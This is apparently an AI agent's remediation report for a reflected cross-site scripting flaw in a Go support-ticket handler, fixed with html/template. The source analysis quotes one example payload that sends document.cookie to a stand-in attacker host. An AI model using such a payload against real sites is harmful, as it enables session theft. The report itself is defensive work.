## Verdict

- CWE-79 (Improper Neutralization of Input During Web Page Generation, Cross-Site Scripting)
- Location: `FprintfHtmlOutput.go`, `ticketStatusHandler`, reported sink at line 16 (`fmt.Fprintf(w, "<p>Customer note: %s</p>", customerNote)`)
- Verdict: **exploitable**
- Confidence: high
- Library recommendation: none - the fix uses `html/template` from the Go standard library, no third-party dependency is required

## Source

- `ticketID := r.URL.Query().Get("id")` - attacker-controlled value from the `id` query parameter of the `/support/ticket` request
- `customerNote := r.URL.Query().Get("note")` - attacker-controlled value from the `note` query parameter of the same request
- Neither value is validated, encoded, or otherwise transformed between the source and the sink.
- Sink (reported): `fmt.Fprintf(w, "<p>Customer note: %s</p>", customerNote)` at line 16, writing directly to the `http.ResponseWriter` with `Content-Type: text/html`. `%s` performs no HTML escaping, so `customerNote` is inserted into the HTML body verbatim - a value such as `<script>document.location='//evil.example/?c='+document.cookie</script>` executes in the victim's browser.
- The immediately preceding line, `fmt.Fprintf(w, "<h2>Ticket %s</h2>", ticketID)`, writes `ticketID` into the same HTML response through the identical unescaped-`Fprintf` pattern. It reaches the same output stream the reported finding is on, so it is addressed by the same fix rather than left as a second, differently-shaped sink in the same handler.

## Fix

### File: FprintfHtmlOutput.go

```go
package main

import (
	"html/template"
	"net/http"
)

var ticketTemplate = template.Must(template.New("ticket").Parse(
	"<html><body><h2>Ticket {{.TicketID}}</h2><p>Customer note: {{.CustomerNote}}</p></body></html>",
))

type ticketPageData struct {
	TicketID     string
	CustomerNote string
}

func ticketStatusHandler(w http.ResponseWriter, r *http.Request) {
	ticketID := r.URL.Query().Get("id")
	customerNote := r.URL.Query().Get("note")

	w.Header().Set("Content-Type", "text/html; charset=utf-8")
	_ = ticketTemplate.Execute(w, ticketPageData{
		TicketID:     ticketID,
		CustomerNote: customerNote,
	})
}

func main() {
	http.HandleFunc("/support/ticket", ticketStatusHandler)
	http.ListenAndServe(":8080", nil)
}
```

## Explanation

The handler built its HTML response by concatenating three `fmt.Fprintf` writes, two of which interpolated request-controlled query parameters (`id`, `note`) directly into HTML with `%s` and no encoding - textbook reflected XSS. The fix replaces all three writes with a single `html/template` template parsed once at package init and executed with a small data struct holding the two values. `html/template` performs context-aware auto-escaping: because both placeholders sit in an HTML body text context, `<`, `>`, `&`, `"`, and `'` in `ticketID` and `customerNote` are escaped to their HTML entity equivalents before being written to the response, so injected markup renders as inert text instead of executing. Fixing `ticketID` as well as the reported `customerNote` keeps the whole response inside one parsed template rather than mixing an escaped call with a still-unescaped `fmt.Fprintf` for the same output, which the loaded Go guidance calls out as its own pitfall - two `fmt.Fprintf` writes into the same HTML page carry the same weakness whether or not both were flagged.

## Behaviour changes

- **Response bytes**: for the reported case (values containing no HTML-significant characters), the emitted HTML is byte-for-byte identical to the original. For values containing `<`, `>`, `&`, `"`, or `'`, the output now contains HTML entities in place of the raw characters - this is the intended effect of closing the weakness, not an unrelated change.
- **`ticketID` handling**: line 15's `fmt.Fprintf(w, "<h2>Ticket %s</h2>", ticketID)` is also now escaped, beyond the single reported line. Reason: it feeds the same HTML response through the identical unescaped-`Fprintf` pattern; leaving it unfixed would leave an equally exploitable XSS one line above the patched one and would require mixing an unescaped `Fprintf` with a `template.Execute` call for the same output, which the loaded Go-specific guidance calls out as an anti-pattern in its own right.
- **Error handling**: the original code discarded every `fmt.Fprintf` return value (it never checked the returned error). The fix preserves that behavior explicitly (`_ = ticketTemplate.Execute(...)`) rather than introducing new error handling not present in the original.
- **Imports**: `fmt` is removed (no longer used) and `html/template` is added - both a direct, necessary consequence of switching sinks, not incidental.
- **Everything else** - route registration, handler signature, response status code, `Content-Type` header, and server startup in `main` - is unchanged.

## Verification

Ran `go vet` and `gofmt -l` against the fixed file in an isolated scratch Go module (not the shared case directory). `go vet` reported no issues; `gofmt -l` reported no formatting differences. `html/template`, `template.Must`, `template.New`, `(*Template).Parse`, and `(*Template).Execute` are all standard-library identifiers from `html/template`, used with their documented signatures.

## Assumptions

- Extended the fix to `ticketID` (line 15) in addition to the reported `customerNote` sink (line 16), since both reach the same HTML output stream via the identical vulnerable pattern - recorded here per the autonomous-mode instruction to note ambiguity resolved without asking.
